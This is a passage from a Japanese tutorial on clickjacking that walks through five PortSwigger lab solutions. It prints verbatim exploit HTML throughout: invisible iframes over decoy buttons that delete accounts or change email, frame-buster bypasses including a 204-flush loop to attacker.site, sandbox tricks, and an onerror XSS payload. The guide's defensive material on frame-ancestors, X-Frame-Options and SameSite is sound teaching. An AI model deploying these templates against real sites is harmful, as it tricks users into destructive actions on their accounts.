ユーザ操作なしで自動化する 204 No Content 版。まず 204 を返すページ（PHP, 逐語）。

```php
<?php
    header("HTTP/1.1 204 No Content");
?>
```

攻撃者ページ（逐語）。

```html
<script>
    var prevent_bust = 0;
    window.onbeforeunload = function() {
        prevent_bust++;
    };
    setInterval(
        function() {
            if (prevent_bust > 0) {
                prevent_bust -= 2;
                window.top.location = "http://attacker.site/204.php";
            }
        }, 1);
</script>
<iframe src="http://target site">
```

〔補足: これがOWASPの「No-Content Flushing」断片（変数名不整合）の整合版に相当する。1msごとに204ページへナビゲーションを飛ばし、frame破りのトップレベル遷移をフラッシュ・無効化する。〕

### XSSフィルタを悪用した歴史的バイパス

古いブラウザには、反射型XSSを検知するとページ内のインラインスクリプトを無効化する機能があった。攻撃者はframe破りスクリプトの冒頭をリクエストパラメータに入れて**偽陽性を誘発**し、frame破りだけを殺せた。

IE8 XSS filter の場合、まず被害側のframe破りは次のようなコード（逐語）。

```html
<script>
    if ( top != self )
    {
        top.location=self.location;
    }
</script>
```

攻撃者ビュー（逐語）。

```html
<iframe src=”http://target site/?param=<script>if”>
```

Chrome 4.0 XSSAuditor filter の場合、コードをリクエストパラメータで渡すと「script」を無効化でき、frame破りコードのスニペットだけを狙い撃ちで無効化できた。攻撃者ビュー（逐語, URLエンコード）。

```html
<iframe src=”http://target site/?param=if(top+!%3D+self)+%7B+top.location%3Dself.location%3B+%7D”>
```

〔補足（一般知識）: IE8 XSSフィルタ・Chrome XSSAuditor はいずれも現行ブラウザで**廃止済み**である。歴史的なframe-busterバイパスとして理解し、現代の主防御はCSP `frame-ancestors` + `X-Frame-Options` + `SameSite` Cookie だと押さえる。〕

### 参考ツール

| ツール | 用途 |
| --- | --- |
| `portswigger/burp`（Burp Suite / Clickbandit） | クリックジャッキングPoCの自動生成 |
| `zaproxy/zaproxy`（OWASP ZAP） | Webアプリ脆弱性スキャナ |
| `machine1337/clickjack` | クリックジャッキングPoC作成補助 |

---

## 手を動かす

ここでは PortSwigger Web Security Academy のクリックジャッキング5ラボを、逐語のHTMLテンプレートで解く。認証情報はいずれも `wiener:peter`、被害者は「`click` の語を含むものは何でもクリックする」という設定である。

### 共通の配送手順

各ラボの exploit server（攻撃用ページを配信するサーバ）に、共通で次のレスポンスヘッダを設定する（逐語）。

```text
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
```

配送フローは全ラボ共通で次のとおり。

```text
1. ラボトップHTMLから id="exploit-link" の href（exploit server URL）を取得
2. exploit server に responseFile=/exploit, responseHead, responseBody,
   formAction=STORE をPOSTして保存（STORE）
3. GET {exploit_server}/deliver-to-victim（302が返れば成功）
4. ラボトップに「Congratulations, you solved the lab!」が出れば解決
```

実際の作業では、Burp の exploit server 画面で Body 欄に下のHTMLを貼り、まず「Store」→「View exploit」で自分で位置を確認し、最後に「Deliver exploit to victim」を押す。位置合わせ時は `opacity` を 0.1〜0.5 にして目視し、提出前に `0.0000` に戻すとよい。`HOST` は各ラボの実URL（`YOUR-LAB-ID.web-security-academy.net`）に置き換える。

### ラボ1: Basic clickjacking with CSRF token protection（APPRENTICE）

- URL: https://portswigger.net/web-security/clickjacking/lab-basic-csrf-protected
- 課題: アカウント削除機能がCSRFトークンで保護されている。アカウントページをフレーム化し、ユーザにアカウントを削除させる悪性HTMLを作る。
- 考え方: Delete ボタンは `/my-account/delete` にPOSTする単純なフォームで本文にCSRFトークンを含む。トークンを知らないので完全な偽フォームは作れない。回避策は2ページを重ねること——「クリックを誘う任意コンテンツのページ」の前面に「**不可視の脆弱ページ**」を置く。脆弱ページは本物のサーバから来ており正規トークンを含むため、CSRF保護は無意味になる。

responseBody（逐語）。

```html
<head>
    <style>
        #vulnerable_page{
            position:relative;
            width:1000px;
            height:800px;
            opacity:0.0000;
            z-index:2;
            }
        #evil_page{
            position:absolute;
            top:515px;
            left:50px;
            z-index:1;
            }
    </style>
</head>
<body>
    <div id="evil_page">
    Click me!!!
    </div>
    <iframe id="vulnerable_page" src="HOST/my-account">
    </iframe>
</body>
```

### ラボ2: Clickjacking with form input data prefilled from a URL parameter（APPRENTICE）

- URL: https://portswigger.net/web-security/clickjacking/lab-prefilled-form-input
- 課題: メール変更機能がCSRFトークンで保護。アカウントページをフレーム化し、ユーザにメールアドレスを変更させる。
- 考え方: JSでiframe内フォームを埋めるのは別ドメインなので不可（同一オリジンポリシー）。正解はサイトのURL引数事前入力機能を使い、iframe の `src` に `?email=mail@evil.me` を付けること。

responseBody（逐語）。

```html
<head>
    <style>
        #victim{
            position:relative;
            width:1000px;
            height:800px;
            opacity:0.0000;
            z-index:2;
            }
        #evil_page{
            position:absolute;
            top:465px;
            left:65px;
            z-index:1;
            }
    </style>
</head>
<body>
    <div id="evil_page">
    Click me!!!
    </div>
    <iframe id="victim" src="HOST/my-account?email=mail@evil.me">
    </iframe>
</body>
```

### ラボ3: Clickjacking with a frame buster script（APPRENTICE）

- URL: https://portswigger.net/web-security/clickjacking/lab-frame-buster-script
- 課題: アプリはframe-bustingスクリプトで対策済み。アカウントページをフレーム化し、メール変更させる。
- 考え方: frame-buster は「自ウィンドウ === 最上位ウィンドウ」でなければページ内容を単純なテキストに差し替える。バイパスは iframe に `sandbox="allow-forms"` を付けること。`allow-forms` でフォーム送信は許可しつつ、`allow-scripts` を**与えない**ことでframe-busterスクリプト自体が走らなくなる（トップレベルナビゲーションも無効化される）。ラボ2との差分は iframe タグに `sandbox="allow-forms"` を追加した点のみ。

responseBody（逐語）。

```html
<head>
    <style>
        #victim{
            position:relative;
            width:1000px;
            height:800px;
            opacity:0.0000;
            z-index:2;
            }
        #evil_page{
            position:absolute;
            top:465px;
            left:65px;
            z-index:1;
            }
    </style>
</head>
<body>
    <div id="evil_page">
    Click me!!!
    </div>
    <iframe id="victim" sandbox="allow-forms" src="HOST/my-account?email=mail@evil.me">
    </iframe>
</body>
```

### ラボ4: Exploiting clickjacking vulnerability to trigger DOM-based XSS（PRACTITIONER）

- URL: https://portswigger.net/web-security/clickjacking/lab-exploiting-to-trigger-dom-based-xss
- 課題: クリックで発火するXSS脆弱性がある。ページをフレーム化し `print()` 関数を呼ばせる。
- 考え方: 入力点は「Submit feedback」フォームと各記事の「comments」。Burpで両方フレーム化可能と確認する。feedbackフォームはURL引数で事前入力可能（commentsは不可）。`value` コンテキストからの脱出（`" id=x"` 等）は `&quot;` に正しくエンコードされ失敗する。しかし name 項目がクライアント側で `<span>` 直上にそのまま挿入され、タグコンテキスト外なので任意HTMLを注入できる。ただし新規 `<script>` ブロックはページ解析後に追加されても実行されないので、解析され直すHTML（`<img>` の `onerror`）を注入する。

XSSペイロード（逐語）。

```html
<img src=x onerror=print()>
```

このペイロードを name 項目にURLパラメータで事前入力し、iframe の `src` に載せる。`opacity` を `0.000` にして Store → Deliver exploit to victim を実行する。テンプレートの骨格はラボ2と同じで、iframe の `src` を feedback フォームのURL（name をこのペイロードで事前入力したもの）にする。

### ラボ5: Multistep clickjacking（PRACTITIONER）

- URL: https://portswigger.net/web-security/clickjacking/lab-multistep
- 課題: アカウント削除機能がCSRFトークンで保護され、さらに**追加確認ダイアログ**がある。ページをフレーム化し、delete と confirm 両ボタンのおとりを用意して、ユーザにアカウントを削除させる。
- 考え方: フォーム自体を改変して `confirmed` 値を足す手は使えない（フォームは触れない）。CSRFトークンにより iframe 内で直接 delete リクエストを発行できず、`/my-account/delete` はGET不可なので iframe に直接ロードもできない。だからユーザに**2回クリック**させる。おとり`div`を2枚（`Click me first!` と `Click me next!`）作り、1枚目を Delete account ボタン、2枚目を確認ボタンの上に重ねる。

responseBody（逐語）。

```html
<head>
    <style>
        #victim{
            position:relative;
            width:1000px;
            height:800px;
            opacity:0.0000;
            z-index:2;
            }
        #evil_page1{
            position:absolute;
            top:515px;
            left:65px;
            z-index:1;
            }
        #evil_page2{
            position:absolute;
            top:310px;
            left:200px;
            z-index:1;
            }
    </style>
</head>
<body>
    <div id="evil_page1">
    Click me first!
    </div>
    <div id="evil_page2">
    Click me next!
    </div>
    <iframe id="victim" src="HOST/my-account">
    </iframe>
</body>
```

### 自分のサイトのフレーム化可否を診断する

診断する側では、まず標的ページがフレーム化を許しているかを見る。ブラウザの開発者ツール（DevTools）の Network タブでページのレスポンスヘッダを開き、`X-Frame-Options` と `Content-Security-Policy: frame-ancestors` が付いているかを確認する。どちらも無ければフレーム化でき、クリックジャッキングの候補になる。次に、上の最小テンプレートで実際に `<iframe src="標的URL">` が中身を表示するか（`X-Frame-Options` で拒否されると空白や `refused to display` になる）を見て裏を取る。

---

## つまずきポイント

- **CSRFトークンがあるからクリックジャッキングも防げる、と誤解する**。トークンは「リクエスト偽造」を防ぐが、被害者が本物のページを本物のトークンごと自分でクリックするクリックジャッキングには無力である（第3節）。
- **`<meta>` タグで `X-Frame-Options` や `frame-ancestors` を設定してしまう**。metaタグでは効かない。必ずHTTPレスポンスヘッダとして設定する（第8節）。
- **`ALLOW-FROM` に頼る**。廃止済みで現代ブラウザでは動かず、fail open で防御が完全に消えることがある。`frame-ancestors` を使う（第8節）。
- **`self`/`none` のシングルクォートを忘れる／他のソースに余計なクォートを付ける**。`frame-ancestors 'none'` は正しく、`frame-ancestors none` は誤り。逆に `*.somesite.com` にクォートは付けない（第7節）。
- **frame-buster スクリプトだけで安心する**。二重フレーム・onBeforeUnload・204・sandbox でバイパスされる。レガシー補助であって主防御ではない（第10節）。
- **iframe 内のフォームをJSで埋めようとする**。別ドメインのiframe内は同一オリジンポリシーで触れない。URLパラメータの事前入力機能を使う（第5-1節）。
- **`opacity: 0.0001` を最初から使って位置合わせに苦労する**。まず 0.1（ラボによっては 0.5）で目視合わせし、提出前に下げる（第4節）。
- **`SameSite` Cookie を万能と考える**。認証を要しないクリックジャッキングには無力で、未対応ブラウザも残る。多層防御の一部である（第9節）。

---

## この節のまとめ

- クリックジャッキング（UI Redressing）は、透明な `<iframe>` を正規サイトとしておとりの上に重ね、被害者に「見えないボタン」を押させるインターフェースベースの攻撃である。
- 使うCSSは `opacity`（透明化）・`z-index`（重なり順）・`position`（位置合わせ）の3つで、「見た目」と「クリックの届く先」を分離する。
- 成立条件は「標的がフレーム化できる」「被害者が認証済み」「操作が数クリックで完了する」の3つ。
- CSRFトークンでは防げない。被害者が本物のページを本物のトークンごと自分でクリックし、リクエストはすべてオンドメインで発生するからである。
- 攻撃の基本形は正典テンプレート（iframe `z-index:2` + おとり `div` `z-index:1`、opacity 0.1→0.0001）。Burp Clickbandit で自動生成もできる。
- 応用は、GETパラメータでのフォーム事前入力、`sandbox="allow-forms"` による frame-buster バイパス、DOM XSSとの連鎖、多段（複数おとり）である。
- 防御は3つの独立メカニズム: フレーム化拒否（`frame-ancestors` / `X-Frame-Options`）、`SameSite` Cookie、frame-buster。可能なら多層防御で重ねる。
- 推奨は CSP `frame-ancestors`。`'none'` が最推奨、`'self'` で自サイトのみ、複数ドメインも列挙できる。`self`/`none` はシングルクォート必須。
- `X-Frame-Options` は後方互換用。`DENY`/`SAMEORIGIN`/（廃止済み）`ALLOW-FROM` の3値。metaタグでは効かず、複数値・マルチドメイン・ネストフレームに弱く非推奨化されている。
- `SameSite=Strict/Lax` の Cookie は iframe 内リクエストに載らないので、認証を要するクリックジャッキングを緩和する。ただし非認証攻撃には無力で補助的。
- frame-buster は古い防御で、二重フレーム化・onBeforeUnload・204 No Content・sandbox/designMode の4種でバイパスされる。単独では信頼できない。
- 診断では、レスポンスヘッダに `X-Frame-Options` / `frame-ancestors` があるかを確認し、無ければ最小テンプレートでフレーム化できるか裏を取る。
- PortSwigger の5ラボ（basic-csrf / prefilled-form / frame-buster / DOM XSS / multistep）は、逐語テンプレートで実際に解いて手を動かすのが定着の近道である。

---

## 理解度チェック

1. クリックジャッキングで使うCSSプロパティを3つ挙げ、それぞれの役割を述べよ。
   ▶ 答え: `opacity`（標的iframeを透明にして中身を見えなくする）、`z-index`（iframeを最前面にしてクリックを受け取らせる）、`position`（おとり文言を本物ボタンの真上に配置する）。

2. なぜCSRFトークンではクリックジャッキングを防げないのか。
   ▶ 答え: 被害者が本物の正規サイトを（透明な状態で）表示し、本物のCSRFトークンが埋め込まれた本物のフォームを自分の手で送信するから。リクエストはすべてオンドメインで発生し、正規トークンごと送られるためサーバから見れば正当に見える。

3. CSP `frame-ancestors` で「どのサイトからもフレーム化を禁止する」設定を、正しい文法で書け。
   ▶ 答え: `Content-Security-Policy: frame-ancestors 'none';`（`none` はシングルクォート必須）。

4. `X-Frame-Options` を `<meta http-equiv="X-Frame-Options" content="deny">` と書くとどうなるか。
   ▶ 答え: 動作しない。`X-Frame-Options`（および CSP `frame-ancestors`）は metaタグでは効かず、HTTPレスポンスヘッダとして設定しなければならない。

5. frame-buster スクリプトのバイパス手法を4つ挙げよ。
   ▶ 答え: 二重フレーム化（Double Framing）、onBeforeUnload イベント、204 No Content フラッシング、sandbox 属性（Chrome）や designMode（Firefox）によるサブフレームJS無効化。

6. iframe 内の別ドメインのフォームをJavaScriptで埋めようとしても失敗するのはなぜか。正しいやり方は何か。
   ▶ 答え: 別オリジンのiframe内は同一オリジンポリシー（SOP）で読み書きできないため。正しくは、サイトがURLのGETパラメータでフォームを事前入力できる機能を使い、iframe の `src` に `?email=...` を付けてロード時に埋める。

7. `sandbox="allow-forms"` を付けた iframe が frame-buster を無効化しつつ標的機能を保てるのはなぜか。
   ▶ 答え: `allow-forms` はフォーム送信を許可するがトップレベルナビゲーションは無効化するので、`top.location = self.location` 型の frame破りが封じられる。さらに `allow-scripts` を付けなければ frame破りスクリプト自体が走らない。

8. `SameSite=Strict` のセッションCookieがクリックジャッキングを緩和する理屈と、その限界を述べよ。
   ▶ 答え: `SameSite=Strict/Lax` の Cookie は iframe 内のページへのリクエストに含まれないので、認証を前提とする攻撃は成立しなくなる。限界は、認証を必要としない攻撃には無力で、未対応ブラウザのユーザが一部（2020年11月時点で約6%）残ること。

9. 多段（multistep）クリックジャッキングでは、確認ダイアログをどう突破するか。
   ▶ 答え: おとり`div`を複数用意し、「Click me first」「Click me next」のように順序を指示して、Delete ボタンと確認ボタンの両方の上に透明なおとりを重ね、被害者に順にクリックさせる。

10. 診断で「このサイトはクリックジャッキング可能か」を最初に確認する手順は何か。
    ▶ 答え: レスポンスヘッダに `X-Frame-Options` または `Content-Security-Policy: frame-ancestors` があるかを DevTools で確認する。無ければ最小の `<iframe src="標的URL">` テンプレートで実際に中身が表示されるか（拒否されないか）を見て裏を取る。

---

## 出典

- OWASP Clickjacking Defense Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html （HTML本体はegress遮断のため、生成元Markdown `https://raw.githubusercontent.com/OWASP/CheatSheetSeries/master/cheatsheets/Clickjacking_Defense_Cheat_Sheet.md` を全文取得）
- PortSwigger Web Security Academy「Clickjacking (UI redressing)」: https://portswigger.net/web-security/clickjacking （本体はegress 403遮断のため二次情報ベース。HTMLテンプレートはGitHubミラー `frank-leitner/portswigger-websecurity-academy` から逐語取得）
- PortSwigger ラボ: https://portswigger.net/web-security/clickjacking/lab-basic-csrf-protected / lab-prefilled-form-input / lab-frame-buster-script / lab-exploiting-to-trigger-dom-based-xss / lab-multistep
- PayloadsAllTheThings — Clickjacking: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Clickjacking
- Busting Frame Busting（Stanford Web Security）: https://seclab.stanford.edu/websec/framebusting/framebust.pdf

<!-- sources: https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html, https://portswigger.net/web-security/clickjacking, https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Clickjacking, https://seclab.stanford.edu/websec/framebusting/framebust.pdf -->
<!-- terms: クリックジャッキング, UI Redressing, フレーム化, iframe, opacity, z-index, position, decoy, CSRFトークン, 同一オリジンポリシー, Content-Security-Policy, frame-ancestors, X-Frame-Options, SameSite Cookie, frame-buster, Double Framing, onBeforeUnload, 204 No Content, sandbox, designMode, descendant frame navigation policy, 多層防御, Burp Clickbandit, DOMベースXSS, multistep clickjacking -->
<!-- self-read: https://portswigger.net/web-security/clickjacking | 本体がegressプロキシで403遮断。本文散文はWebSearch逐語断片、PoCはGitHubミラーから逐語取得した二次情報ベース -->
<!-- self-read: https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html | HTML版本体はegress遮断。生成元の同一Markdown原本を全文取得して記述 -->
<!-- self-read: https://seclab.stanford.edu/websec/framebusting/framebust.pdf | frame-busterバイパスの学術的原典。PDF本体はegress制限で取得せず、OWASP経由の二次情報で要約 -->
